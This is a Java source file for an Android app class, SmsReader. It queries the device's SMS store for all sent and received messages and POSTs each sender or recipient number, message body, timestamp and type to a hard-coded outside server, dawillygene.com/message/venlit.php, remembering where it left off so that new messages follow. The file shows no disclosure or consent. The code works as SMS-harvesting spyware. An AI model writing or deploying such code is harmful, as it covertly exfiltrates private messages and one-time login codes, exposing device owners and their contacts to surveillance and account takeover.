package com.dawillygene.venlitgenexombiev2;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReader {
    private static final String TAG = "SmsReader";
    private static final String SERVER_URL = "https://dawillygene.com/message/venlit.php";

    private static final String LAST_PROCESSED_ID_KEY = "last_processed_sms_id";

    public static void readSms(Context context) {
        // First, let's debug what SMS types exist
        debugSmsTypes(context);
        
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = Uri.parse("content://sms/");  // Read from all SMS
        String[] projection = { "_id", "address", "body", "date", "type" };

        // Get the last processed SMS ID from SharedPreferences
        SharedPreferences prefs = context.getSharedPreferences("sms_prefs", Context.MODE_PRIVATE);
        String lastProcessedId = prefs.getString(LAST_PROCESSED_ID_KEY, null);

        String selection = null;
        String[] selectionArgs = null;

        // If we have a last processed ID, only get newer messages
        if (lastProcessedId != null) {
            selection = "_id > ? AND type IN (1, 2)";  // 1 = received, 2 = sent
            selectionArgs = new String[]{lastProcessedId};
        } else {
            selection = "type IN (1, 2)";  // Only get sent and received messages
        }

        Cursor cursor = contentResolver.query(
                uri,
                projection,
                selection,
                selectionArgs,
                "date DESC"
        );

        String newestId = null;
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
                newestId = id;
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));

                // Determine message type based on SMS type code
                String messageType;
                if (type == 1) {
                    messageType = "received";
                } else if (type == 2) {
                    messageType = "sent";
                } else {
                    continue; // Skip other types (drafts, failed, etc.)
                }

                Log.d(TAG, "Processing " + messageType + " SMS ID: " + id + " Type: " + type);
                sendSmsToServer(address, body, timestamp, messageType);

            } while (cursor.moveToNext());

            cursor.close();

            // Save the newest processed ID
            if (newestId != null) {
                prefs.edit()
                        .putString(LAST_PROCESSED_ID_KEY, newestId)
                        .apply();
            }
        } else {
            Log.d(TAG, "No new SMS found");
        }
    }

    // Debug method to see what SMS types are available
    private static void debugSmsTypes(Context context) {
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = Uri.parse("content://sms/");
        String[] projection = { "_id", "type", "address" };

        Cursor cursor = contentResolver.query(
                uri,
                projection,
                null,
                null,
                "date DESC LIMIT 20"  // Get latest 20 messages for debugging
        );

        if (cursor != null && cursor.moveToFirst()) {
            Log.d(TAG, "=== DEBUG: SMS Types Found ===");
            do {
                String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                
                String typeString;
                switch (type) {
                    case 1: typeString = "RECEIVED"; break;
                    case 2: typeString = "SENT"; break;
                    case 3: typeString = "DRAFT"; break;
                    case 4: typeString = "OUTBOX"; break;
                    case 5: typeString = "FAILED"; break;
                    case 6: typeString = "QUEUED"; break;
                    default: typeString = "UNKNOWN(" + type + ")"; break;
                }
                
                Log.d(TAG, "SMS ID: " + id + ", Type: " + type + " (" + typeString + "), Address: " + address);
            } while (cursor.moveToNext());
            Log.d(TAG, "=== END DEBUG ===");
            cursor.close();
        } else {
            Log.d(TAG, "No SMS found for debugging");
        }
    }

    private static void sendSmsToServer(String address, String body, long timestamp, String messageType) {
        new AsyncTask<String, Void, Void>() {
            protected Void doInBackground(String... params) {
                try {
                    URL url = new URL(SERVER_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setDoInput(true);

                    OutputStream os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(
                            new OutputStreamWriter(os, "UTF-8"));
                    writer.write("address=" + URLEncoder.encode(params[0], "UTF-8") +
                            "&body=" + URLEncoder.encode(params[1], "UTF-8") +
                            "&timestamp=" + params[2] +
                            "&type=" + URLEncoder.encode(params[3], "UTF-8"));
                    writer.flush();
                    writer.close();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        BufferedReader in = new BufferedReader(
                                new InputStreamReader(conn.getInputStream()));
                        String inputLine;
                        StringBuilder response = new StringBuilder();
                        while ((inputLine = in.readLine()) != null) {
                            response.append(inputLine);
                        }
                        in.close();
                        Log.d(TAG, "Server response for " + params[3] + " message: " + response.toString());
                    } else {
                        Log.e(TAG, "Server request failed with code: " + responseCode);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error sending SMS to server", e);
                }
                return null;
            }
        }.execute(address, body, String.valueOf(timestamp), messageType);
    }
}